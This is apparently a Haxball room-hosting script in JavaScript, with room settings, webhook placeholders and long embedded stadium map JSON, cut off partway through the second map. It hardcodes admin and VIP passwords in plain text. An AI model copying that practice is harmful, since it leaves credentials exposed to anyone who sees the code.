/* VARIABLES */

/* ROOM */

const roomName = '🦴 Acemi Odası 🎃 FUTSAL + POWER 🔰';
const maxPlayers = 18;
const roomPublic = true;
const token = ""; // Insert token here

var roomWebhook = ''; // this webhook is used to send the details of the room (chat, join, leave) ; it should be in a private discord channel
var gameWebhook = ''; // this webhook is used to send the summary of the games ; it should be in a public discord channel
var PasswordsURL = '';
var fetchRecordingVariable = true;
var timeLimit = 6;
var scoreLimit = 100;

var gameConfig = {
    roomName: roomName,
    maxPlayers: maxPlayers,
    public: roomPublic,
    noPlayer: true,
}

var VipAdminSifresi = "visdsdfsdf"
var AdminSifresi = "prlove579";
var vipSifre = "vipuserdqwqw32321";

if (typeof token == 'string' && token.length == 39) {
    gameConfig.token = token;
}

var room = HBInit(gameConfig);

function NormalMap() {
var NormalMap = `{"name":"AF | V7 Futsal","width":1080,"height":532,"bg": { "type": "", "width": 0, "height": 0, "color": "303030" },"vertexes":[{"x":-950,"y":460,"cMask":["ball"]},{"x":-950,"y":90,"cMask":["ball"]},{"x":-950,"y":-90,"cMask":["ball"]},{"x":-950,"y":-460,"cMask":["ball"]},{"x":950,"y":456,"cMask":["ball"]},{"x":950,"y":90,"cMask":["ball"]},{"x":950,"y":-90,"cMask":["ball"]},{"x":950,"y":-456,"cMask":["ball"]},{"x":0,"y":508,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":0,"y":150,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":0,"y":-150,"bCoef":0,"cMask":[]},{"x":0,"y":-508,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":-995,"y":-90,"bCoef":0.1,"cMask":["ball"]},{"x":995,"y":-90,"bCoef":0.1,"cMask":["ball"]},{"x":-995,"y":90,"bCoef":0.1,"cMask":["ball"]},{"x":995,"y":90,"bCoef":0.1,"cMask":["ball"]},{"x":951,"y":460,"cMask":["ball"]},{"x":951,"y":-460,"cMask":["ball"]},{"x":0,"y":460,"bCoef":0,"cMask":[]},{"x":0,"y":-460,"bCoef":0,"cMask":[]},{"x":0,"y":150,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":0,"y":-150,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"x":958,"y":-90,"cMask":["ball"]},{"x":958,"y":-456,"cMask":["ball"]},{"x":-958,"y":-90,"cMask":["ball"]},{"x":-958,"y":-456,"cMask":["ball"]},{"x":-958,"y":90,"cMask":["ball"]},{"x":-958,"y":456,"cMask":["ball"]},{"x":958,"y":90,"cMask":["ball"]},{"x":958,"y":456,"cMask":["ball"]},{"x":0,"y":-9,"bCoef":0,"cMask":[]},{"x":0,"y":9,"bCoef":0,"cMask":[]},{"x":0,"y":-9,"bCoef":0,"cMask":[]},{"x":0,"y":9,"bCoef":0,"cMask":[]},{"x":634.21528583524,"y":-109.20953737271,"bCoef":0,"cMask":[]},{"x":634.21528583524,"y":114.16613046747,"bCoef":0,"cMask":[]},{"x":634.21528583524,"y":114.16613046747,"bCoef":0,"cMask":[]},{"x":950,"y":324.62551819445,"bCoef":0,"cMask":[]},{"x":634.21528583524,"y":-109.20953737271,"bCoef":0,"cMask":[]},{"x":634.35340467604,"y":4.2212921610516,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":1.7712285482462,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":6.6713557738571,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":-0.67883506455928,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":0.54619674184346,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":5.4463239674544,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":-1.2913509677606,"bCoef":0.1,"cMask":[]},{"x":634.35340467604,"y":7.2838716770584,"bCoef":0.1,"cMask":[]},{"x":-950,"y":432.90041943973,"bCoef":0.1,"cMask":[]},{"x":-926.21802170761,"y":460,"bCoef":0.1,"cMask":[]},{"x":-950,"y":-433.32499678239,"bCoef":0.1,"cMask":[]},{"x":-925.43621788149,"y":-460,"bCoef":0.1,"cMask":[]},{"x":950,"y":-433.36622514797,"bCoef":0.1,"cMask":[]},{"x":927.73220749769,"y":-460,"bCoef":0.1,"cMask":[]},{"x":950,"y":434.55334331787,"bCoef":0.1,"cMask":[]},{"x":925.51401132381,"y":460,"bCoef":0.1,"cMask":[]},{"x":950,"y":-319.66892509968,"bCoef":0,"cMask":[]},{"x":-635.67083595539,"y":111.16613046747,"bCoef":0,"cMask":[]},{"x":-635.67083595539,"y":-112.20953737271,"bCoef":0,"cMask":[]},{"x":-950,"y":-322.66892509968,"bCoef":0,"cMask":[]},{"x":-635.82253673536,"y":-2.314063297901,"bCoef":0.1,"cMask":[]},{"x":-635.83851134042,"y":0.13595112921681,"bCoef":0.1,"cMask":[]},{"x":-635.80656213031,"y":-4.764077725019,"bCoef":0.1,"cMask":[]},{"x":-635.85448594547,"y":2.5859655563347,"bCoef":0.1,"cMask":[]},{"x":-635.84649864294,"y":1.3609583427757,"bCoef":0.1,"cMask":[]},{"x":-635.81454943284,"y":-3.53907051146,"bCoef":0.1,"cMask":[]},{"x":-635.85847959673,"y":3.1984691631142,"bCoef":0.1,"cMask":[]},{"x":-635.80256847905,"y":-5.3765813317984,"bCoef":0.1,"cMask":[]},{"x":-950,"y":321.62551819445,"bCoef":0,"cMask":[]},{"x":-0.077614373673782,"y":-2.4626457981722,"bCoef":0.1,"cMask":[]},{"x":-0.10499941090626,"y":2.3835365851378,"bCoef":0.1,"cMask":[]},{"x":-0.050229336441873,"y":-7.3088281814824,"bCoef":0.1,"cMask":[]},{"x":-0.13238444813857,"y":7.2297189684479,"bCoef":0.1,"cMask":[]},{"x":-0.11869192952281,"y":4.8066277767929,"bCoef":0.1,"cMask":[]},{"x":-0.063921855057799,"y":-4.8857369898273,"bCoef":0.1,"cMask":[]},{"x":-0.13923070744664,"y":8.4412645642754,"bCoef":0.1,"cMask":[]},{"x":-0.043383077133171,"y":-8.5203737773099,"bCoef":0.1,"cMask":[]},{"x":0.77952848346911,"y":1.5373542018278,"bCoef":0.1,"cMask":[]},{"x":2.7521434462366,"y":3.3835365851378,"bCoef":0.1,"cMask":[]},{"x":0.80691352070102,"y":-3.3088281814824,"bCoef":0.1,"cMask":[]},{"x":1.7247584090043,"y":2.2297189684479,"bCoef":0.1,"cMask":[]},{"x":2.73845092762,"y":5.8066277767929,"bCoef":0.1,"cMask":[]},{"x":0.79322100208503,"y":-0.88573698982727,"bCoef":0.1,"cMask":[]},{"x":1.7179121496962,"y":3.4412645642754,"bCoef":0.1,"cMask":[]},{"x":0.81375978000966,"y":-4.5203737773099,"bCoef":0.1,"cMask":[]},{"x":-950,"y":-322.66892509968,"bCoef":0,"cMask":[]},{"x":-950,"y":321.62551819445,"bCoef":0,"cMask":[]},{"x":-635.67083595539,"y":111.16613046747,"bCoef":0,"cMask":[]},{"x":-950,"y":321.62551819445,"bCoef":0,"cMask":[]},{"x":-635.67083595539,"y":-112.20953737271,"bCoef":0,"cMask":[]},{"x":-950,"y":-322.66892509968,"bCoef":0,"cMask":[]}],"segments":[{"v0":0,"v1":1,"vis":false,"cMask":["ball"]},{"v0":2,"v1":3,"vis":false,"cMask":["ball"]},{"v0":4,"v1":5,"vis":false,"cMask":["ball"]},{"v0":6,"v1":7,"vis":false,"cMask":["ball"]},{"v0":8,"v1":9,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"v0":9,"v1":10,"curve":180,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["blueKO"],"curveF":6.123233995736766e-17},{"v0":10,"v1":9,"curve":180,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO"],"curveF":6.123233995736766e-17},{"v0":10,"v1":11,"vis":false,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"]},{"v0":2,"v1":12,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":6,"v1":13,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":1,"v1":14,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":5,"v1":15,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":12,"v1":14,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":13,"v1":15,"color":"FFFFFF","bCoef":0.1,"cMask":["ball"]},{"v0":1,"v1":0,"color":"FFFFFF","cMask":["ball"]},{"v0":5,"v1":4,"color":"FFFFFF","cMask":["ball"]},{"v0":2,"v1":3,"color":"FFFFFF","cMask":["ball"]},{"v0":6,"v1":7,"color":"FFFFFF","cMask":["ball"]},{"v0":0,"v1":16,"color":"FFFFFF","cMask":["ball"]},{"v0":3,"v1":17,"color":"FFFFFF","cMask":["ball"]},{"v0":18,"v1":19,"color":"FFFFFF","bCoef":0,"cMask":[]},{"v0":9,"v1":10,"curve":180,"color":"FFFFFF","bCoef":0,"cMask":[],"curveF":6.123233995736766e-17},{"v0":21,"v1":20,"curve":180,"color":"FFFFFF","bCoef":0,"cMask":[],"curveF":6.123233995736766e-17},{"v0":2,"v1":1,"color":"FFFFFF","bCoef":0,"cMask":[]},{"v0":6,"v1":5,"color":"FFFFFF","bCoef":0,"cMask":[]},{"v0":22,"v1":23,"vis":false,"color":"FFFFFF","cMask":["ball"]},{"v0":24,"v1":25,"vis":false,"color":"FFFFFF","cMask":["ball"]},{"v0":26,"v1":27,"vis":false,"color":"FFFFFF","cMask":["ball"]},{"v0":28,"v1":29,"vis":false,"color":"FFFFFF","cMask":["ball"]},{"v0":31,"v1":30,"curve":180,"color":"FFFFFF","bCoef":0,"cMask":[],"curveF":6.123233995736766e-17},{"v0":32,"v1":33,"curve":180,"color":"FFFFFF","bCoef":0,"cMask":[],"curveF":6.123233995736766e-17},{"v0":34,"v1":35,"color":"F8F8F8","bCoef":0,"cMask":[]},{"v0":37,"v1":36,"curve":89.99999999999999,"color":"F8F8F8","bCoef":0,"cMask":[],"curveF":1.0000000000000002},{"v0":40,"v1":39,"curve":-179.99999999985,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-1.3091137582980271e-12},{"v0":39,"v1":40,"curve":-179.99999999989004,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-9.59837594750953e-13},{"v0":42,"v1":41,"curve":179.99999999999,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":8.732476207549468e-14},{"v0":41,"v1":42,"curve":-179.99999999999002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-8.720229739557994e-14},{"v0":44,"v1":43,"curve":-179.99999999994003,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-5.235199460732664e-13},{"v0":43,"v1":44,"curve":-179.99999999999002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-8.720229739557994e-14},{"v0":46,"v1":45,"curve":179.99999999999,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":8.732476207549468e-14},{"v0":45,"v1":46,"curve":179.99999999999,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":8.732476207549468e-14},{"v0":47,"v1":48,"curve":91.636910923379,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.9718309859154628},{"v0":50,"v1":49,"curve":91.636910923384,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.9718309859153781},{"v0":51,"v1":52,"curve":91.636910923386,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.9718309859153441},{"v0":54,"v1":53,"curve":91.636910923367,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.9718309859156665},{"v0":38,"v1":55,"curve":89.99999999999999,"color":"F8F8F8","bCoef":0,"cMask":[],"curveF":1.0000000000000002},{"v0":56,"v1":57,"color":"F8F8F8","bCoef":0,"cMask":[]},{"v0":60,"v1":59,"curve":-179.95850096528002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.00036214741196362337},{"v0":59,"v1":60,"curve":-179.95850096552002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474098692984},{"v0":62,"v1":61,"curve":-179.95850096539,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474110039465},{"v0":61,"v1":62,"curve":-179.95850096543003,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.00036214741065467026},{"v0":64,"v1":63,"curve":-179.95850096540002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474109164609},{"v0":63,"v1":64,"curve":-179.95850096542003,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474107419338},{"v0":66,"v1":65,"curve":-179.95850096542003,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474107419338},{"v0":65,"v1":66,"curve":-179.95850096540002,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":-0.0003621474109164609},{"v0":69,"v1":68,"curve":179.83332296199,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325761397712},{"v0":68,"v1":69,"curve":179.8333229623,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.001454532573434374},{"v0":71,"v1":70,"curve":179.83332296215,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325747435517},{"v0":70,"v1":71,"curve":179.8333229621,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325751798702},{"v0":73,"v1":72,"curve":179.83332296204,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325757034527},{"v0":72,"v1":73,"curve":179.83332296211,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325750926065},{"v0":75,"v1":74,"curve":179.8333229621,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325751798702},{"v0":74,"v1":75,"curve":179.83332296208,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325753543975},{"v0":77,"v1":76,"curve":179.83332296199,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325761397712},{"v0":76,"v1":77,"curve":179.8333229623,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.001454532573434374},{"v0":79,"v1":78,"curve":179.83332296215,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325747435517},{"v0":78,"v1":79,"curve":179.8333229621,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325751798702},{"v0":81,"v1":80,"curve":179.83332296204,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325757034527},{"v0":80,"v1":81,"curve":179.83332296211,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325750926065},{"v0":83,"v1":82,"curve":179.8333229621,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325751798702},{"v0":82,"v1":83,"curve":179.83332296208,"color":"F8F8F8","bCoef":0.1,"cMask":[],"curveF":0.0014545325753543975},{"v0":86,"v1":87,"curve":89.99999999999999,"color":"F8F8F8","bCoef":0,"cMask":[],"curveF":1.0000000000000002},{"v0":89,"v1":88,"curve":89.99999999999999,"color":"F8F8F8","bCoef":0,"cMask":[],"curveF":1.0000000000000002}],"planes":[{"normal":[0,1],"dist":-456,"cMask":["ball"]},{"normal":[0,-1],"dist":-456,"cMask":["ball"]},{"normal":[0,1],"dist":-508,"bCoef":0.2},{"normal":[0,-1],"dist":-508,"bCoef":0.2},{"normal":[1,0],"dist":-1002,"bCoef":0.2},{"normal":[-1,0],"dist":-1002,"bCoef":0.2}],"goals":[{"p0":[-957.4,-90],"p1":[-957.4,90],"team":"red"},{"p0":[957.4,90],"p1":[957.4,-90],"team":"blue"}],"discs":[{"radius":6.4,"invMass":1.5,"pos":[0,0],"color":"FFCC00","bCoef":0.4,"cGroup":["ball","kick","score"]},{"radius":5,"invMass":0,"pos":[-950,90],"color":"6666CC","bCoef":1},{"radius":5,"invMass":0,"pos":[-950,-90],"color":"6666CC","bCoef":1},{"radius":5,"invMass":0,"pos":[950,90],"color":"6666CC","bCoef":1},{"radius":5,"invMass":0,"pos":[950,-90],"color":"6666CC","bCoef":1},{"radius":3,"invMass":0,"pos":[-950,460],"color":"FFCC00","bCoef":0.1,"cMask":[]},{"radius":3,"invMass":0,"pos":[-950,-460],"color":"FFCC00","bCoef":0.1,"cMask":[]},{"radius":3,"invMass":0,"pos":[950,-460],"color":"FFCC00","bCoef":0.1,"cMask":[]},{"radius":3,"invMass":0,"pos":[950,460],"color":"FFCC00","bCoef":0.1,"cMask":[]}],"playerPhysics":{"bCoef":0,"acceleration":0.11,"kickingAcceleration":0.083},"ballPhysics":"disc0","spawnDistance":310,"traits":[],"joints":[],"redSpawnPoints":[],"blueSpawnPoints":[],"canBeStored":true}`;
RSRMap = false;
return NormalMap;
}

function PowerMap() {
var PowerMap = `{

	"name" : "AF | V7 Power",

	"width" : 1290,

	"height" : 635,

	"bg" : { "color" : "303030" },

	"vertexes" : [
		/* 0 */ { "x" : -1200, "y" : -600, "cMask" : ["ball" ], "cGroup" : ["ball" ] },
		/* 1 */ { "x" : 1200, "y" : -600, "cMask" : ["ball" ], "cGroup" : ["ball" ] },
		/* 2 */ { "x" : -1200, "y" : 600, "cMask" : ["ball" ], "cGroup" : ["ball" ] },
		/* 3 */ { "x" : 1200, "y" : 600, "cMask" : ["ball" ], "cGroup" : ["ball" ] },
		/* 4 */ { "x" : -1200, "y" : -108, "cMask" : ["ball" ], "cGroup" : ["ball" ], "vis" : true },
		/* 5 */ { "x" : 1200, "y" : -108, "cMask" : ["ball" ], "cGroup" : ["ball" ], "vis" : true },
		/* 6 */ { "x" : 1200, "y" : 108, "cMask" : ["ball" ], "cGroup" : ["ball" ], "vis" : true },
		/* 7 */ { "x" : -1200, "y" : 108, "cMask" : ["ball" ], "cGroup" : ["ball" ], "vis" : true },
		/* 8 */ { "x" : -1252, "y" : -108, "cMask" : [ ], "cGroup" : [ ], "vis" : true },
		/* 9 */ { "x" : -1252, "y" : 108, "cMask" : [ ], "cGroup" : [ ], "vis" : true },
		/* 10 */ { "x" : 1252, "y" : -108, "cMask" : [ ], "cGroup" : [ ], "vis" : true },
		/* 11 */ { "x" : 1252, "y" : 108, "cMask" : [ ], "cGroup" : [ ], "vis" : true },
		/* 12 */ { "x" : 0, "y" : -600, "cMask" : [ ], "cGroup" : [ ] },
		/* 13 */ { "x" : 0, "y" : -120, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		/* 14 */ { "x" : 0, "y" : 120, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		/* 15 */ { "x" : 0, "y" : 600, "cMask" : [ ], "cGroup" : [ ] },
		/* 16 */ { "x" : 840, "y" : 400, "cMask" : [ ], "cGroup" : [ ] },
		/* 17 */ { "x" : -840, "y" : -400, "cMask" : [ ], "cGroup" : [ ] },
		/* 18 */ { "x" : -840, "y" : 400, "cMask" : [ ], "cGroup" : [ ] },
		/* 19 */ { "x" : 840, "y" : -400, "cMask" : [ ], "cGroup" : [ ] },
		/* 20 */ { "x" : -840, "y" : 400, "cMask" : [ ], "cGroup" : [ ] },
		/* 21 */ { "x" : -1206.5, "y" : -600, "cMask" : [ ], "cGroup" : [ ] },
		/* 22 */ { "x" : -1206.5, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 23 */ { "x" : 1543.25, "y" : 644, "cMask" : [ ], "cGroup" : [ ] },
		/* 24 */ { "x" : 1543.25, "y" : 154, "cMask" : [ ], "cGroup" : [ ] },
		/* 25 */ { "x" : -1206.5, "y" : 600, "cMask" : [ ], "cGroup" : [ ] },
		/* 26 */ { "x" : 1206.5, "y" : -600, "cMask" : [ ], "cGroup" : [ ] },
		/* 27 */ { "x" : 1206.5, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 28 */ { "x" : 1206.5, "y" : 600, "cMask" : [ ], "cGroup" : [ ] },
		/* 29 */ { "x" : 1206.5, "y" : 105, "cMask" : [ ], "cGroup" : [ ] },
		/* 30 */ { "x" : -1202, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 31 */ { "x" : -1202, "y" : 95, "cMask" : [ ], "cGroup" : [ ] },
		/* 32 */ { "x" : 1202, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 33 */ { "x" : 1202, "y" : 105, "cMask" : [ ], "cGroup" : [ ] },
		/* 34 */ { "x" : 1200, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 35 */ { "x" : 1200, "y" : 105, "cMask" : [ ], "cGroup" : [ ] },
		/* 36 */ { "x" : -1198, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 37 */ { "x" : -1198, "y" : 105, "cMask" : [ ], "cGroup" : [ ] },
		/* 38 */ { "x" : -1199, "y" : 105, "cMask" : [ ], "cGroup" : [ ] },
		/* 39 */ { "x" : -1199, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 40 */ { "x" : 1201, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 41 */ { "x" : 1200, "y" : 105, "cMask" : [ ], "cGroup" : [ ] },
		/* 42 */ { "x" : 1200, "y" : 105, "cMask" : [ ], "cGroup" : [ ] },
		/* 43 */ { "x" : -1200, "y" : -105, "cMask" : [ ], "cGroup" : [ ] },
		/* 44 */ { "x" : -1200, "y" : 105, "cMask" : [ ], "cGroup" : [ ] },
		/* 45 */ { "x" : -1199.5, "y" : 110, "cMask" : [ ], "cGroup" : [ ] },
		/* 46 */ { "x" : -1200, "y" : 400, "cMask" : [ ], "cGroup" : [ ] },
		/* 47 */ { "x" : -840, "y" : -400, "cMask" : [ ], "cGroup" : [ ] },
		/* 48 */ { "x" : -1200, "y" : -400, "cMask" : [ ], "cGroup" : [ ] },
		/* 49 */ { "x" : 840, "y" : -400, "cMask" : [ ], "cGroup" : [ ] },
		/* 50 */ { "x" : 1200, "y" : -400, "cMask" : [ ], "cGroup" : [ ] },
		/* 51 */ { "x" : 1200, "y" : 400, "cMask" : [ ], "cGroup" : [ ] },
		/* 52 */ { "x" : 840, "y" : 400, "cMask" : [ ], "cGroup" : [ ] },
		/* 53 */ { "x" : -1170, "y" : -600, "cMask" : [ ], "cGroup" : [ ] },
		/* 54 */ { "x" : -1200, "y" : -570, "cMask" : [ ], "cGroup" : [ ] },
		/* 55 */ { "x" : -1200, "y" : 570, "cMask" : [ ], "cGroup" : [ ] },
		/* 56 */ { "x" : -1170, "y" : 600, "cMask" : [ ], "cGroup" : [ ] },
		/* 57 */ { "x" : 1200, "y" : 570, "cMask" : [ ], "cGroup" : [ ] },
		/* 58 */ { "x" : 1170, "y" : 600, "cMask" : [ ], "cGroup" : [ ] },
		/* 59 */ { "x" : 1170, "y" : -600, "cMask" : [ ], "cGroup" : [ ] },
		/* 60 */ { "x" : 1200, "y" : -570, "cMask" : [ ], "cGroup" : [ ] },
		/* 61 */ { "x" : 0, "y" : -80, "cMask" : ["wall" ], "cGroup" : ["all" ] },
		/* 62 */ { "x" : 0, "y" : 80, "cMask" : ["wall" ], "cGroup" : ["all" ] },
		/* 63 */ { "x" : 0, "y" : -75, "cMask" : ["wall" ], "cGroup" : ["all" ] },
		/* 64 */ { "x" : 0, "y" : 75, "cMask" : ["wall" ], "cGroup" : ["all" ] },
		/* 65 */ { "x" : -840, "y" : -95, "cMask" : ["wall" ] },
		/* 66 */ { "x" : -840, "y" : 95, "cMask" : ["wall" ] },
		/* 67 */ { "x" : 840, "y" : -95, "cMask" : ["wall" ] },
		/* 68 */ { "x" : 840, "y" : 95, "cMask" : ["wall" ] },
		/* 69 */ { "x" : 940, "y" : 0, "cMask" : ["wall" ] },
		/* 70 */ { "x" : 945, "y" : 0, "cMask" : ["wall" ] },
		/* 71 */ { "x" : -945, "y" : 0, "cMask" : ["wall" ] },
		/* 72 */ { "x" : -940, "y" : 0, "cMask" : ["wall" ] },
		/* 73 */ { "x" : 1200, "y" : -160, "cMask" : ["wall" ] },
		/* 74 */ { "x" : 1050, "y" : -160, "cMask" : ["wall" ] },
		/* 75 */ { "x" : 1050, "y" : 160, "cMask" : ["wall" ] },
		/* 76 */ { "x" : 1200, "y" : 160, "cMask" : ["wall" ] },
		/* 77 */ { "x" : -1199, "y" : -160, "cMask" : ["wall" ] },
		/* 78 */ { "x" : -1050, "y" : -160, "cMask" : ["wall" ] },
		/* 79 */ { "x" : -1050, "y" : 160, "cMask" : ["wall" ] },
		/* 80 */ { "x" : -1200, "y" : 160, "cMask" : ["wall" ] },
		/* 81 */ { "x" : -1198.5, "y" : -108, "cMask" : ["wall" ] },
		/* 82 */ { "x" : -1197.5, "y" : 110.5, "cMask" : ["wall" ] },
		/* 83 */ { "x" : -1202, "y" : -109, "cMask" : ["wall" ] },
		/* 84 */ { "x" : -1202, "y" : 110.5, "cMask" : ["wall" ] },
		/* 85 */ { "x" : 1202.5, "y" : -107, "cMask" : ["wall" ] },
		/* 86 */ { "x" : 1203.5, "y" : 109.5, "cMask" : ["wall" ] },
		/* 87 */ { "x" : 1198, "y" : -108, "cMask" : ["wall" ] },
		/* 88 */ { "x" : 1199, "y" : 110.5, "cMask" : ["wall" ] },
		/* 89 */ { "x" : 0, "y" : -630, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		/* 90 */ { "x" : 0, "y" : -601, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		/* 91 */ { "x" : 1, "y" : 604, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		/* 92 */ { "x" : 0, "y" : 632, "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] },
		/* 93 */ { "x" : -79, "y" : -87, "cMask" : ["wall" ] },
		/* 94 */ { "x" : -7, "y" : -89, "cMask" : ["wall" ] },
		/* 95 */ { "x" : -69, "y" : -72, "cMask" : ["wall" ] },
		/* 96 */ { "x" : -7, "y" : 66, "cMask" : ["wall" ] },
		/* 97 */ { "x" : -26, "y" : 47, "cMask" : ["wall" ] },
		/* 98 */ { "x" : -28, "y" : -11, "cMask" : ["wall" ] },
		/* 99 */ { "x" : -71, "y" : -12, "cMask" : ["wall" ] },
		/* 100 */ { "x" : -59, "y" : 0, "cMask" : ["wall" ] },
		/* 101 */ { "x" : -59, "y" : 41, "cMask" : ["wall" ] },
		/* 102 */ { "x" : -100, "y" : -1, "cMask" : ["wall" ] },
		/* 103 */ { "x" : -47, "y" : -70, "cMask" : ["wall" ] },
		/* 104 */ { "x" : -31, "y" : -71, "cMask" : ["wall" ] },
		/* 105 */ { "x" : -30, "y" : -25, "cMask" : ["wall" ] },
		/* 106 */ { "x" : -68, "y" : -25, "cMask" : ["wall" ] },
		/* 107 */ { "x" : -1, "y" : -88, "cMask" : ["wall" ] },
		/* 108 */ { "x" : 0, "y" : 27, "cMask" : ["wall" ] },
		/* 109 */ { "x" : -75, "y" : -87, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 110 */ { "x" : -3, "y" : -89, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 111 */ { "x" : -65, "y" : -72, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 112 */ { "x" : -3, "y" : 66, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 113 */ { "x" : -22, "y" : 47, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 114 */ { "x" : -24, "y" : -11, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 115 */ { "x" : -67, "y" : -12, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 116 */ { "x" : -55, "y" : 0, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 117 */ { "x" : -55, "y" : 41, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 118 */ { "x" : -96, "y" : -1, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 119 */ { "x" : -43, "y" : -70, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 120 */ { "x" : -27, "y" : -71, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 121 */ { "x" : -26, "y" : -25, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 122 */ { "x" : -64, "y" : -25, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 123 */ { "x" : 3, "y" : -88, "cMask" : ["wall" ], "color" : "a3a3a3" },
		/* 124 */ { "x" : 4, "y" : 27, "cMask" : ["wall" ], "color" : "a3a3a3" },
		
		/* 125 */ { "x" : -700, "y" : -631, "bCoef" : 0, "cMask" : ["c0" ], "cGroup" : ["all" ], "trait" : "ballArea", "vis" : true, "color" : "282828" },
		/* 126 */ { "x" : -700, "y" : 631, "bCoef" : 0, "cMask" : ["c0" ], "cGroup" : ["all" ], "trait" : "ballArea", "vis" : true, "color" : "282828" },
		/* 127 */ { "x" : 700, "y" : -631, "bCoef" : 0, "cMask" : ["c0" ], "cGroup" : ["all" ], "trait" : "ballArea", "color" : "282828", "vis" : true },
		/* 128 */ { "x" : 700, "y" : 631, "bCoef" : 0, "cMask" : ["c0" ], "cGroup" : ["all" ], "trait" : "ballArea", "color" : "282828", "vis" : true },
		
		/* 129 */ { "x" : -1200, "y" : -111, "cMask" : ["ball" ], "cGroup" : ["ball" ], "vis" : false, "color" : "000000" },
		/* 130 */ { "x" : -1255, "y" : -111, "cMask" : [ ], "cGroup" : [ ], "vis" : false, "color" : "000000" },
		/* 131 */ { "x" : -1254, "y" : -111, "cMask" : [ ], "cGroup" : [ ], "vis" : false, "color" : "transparent" },
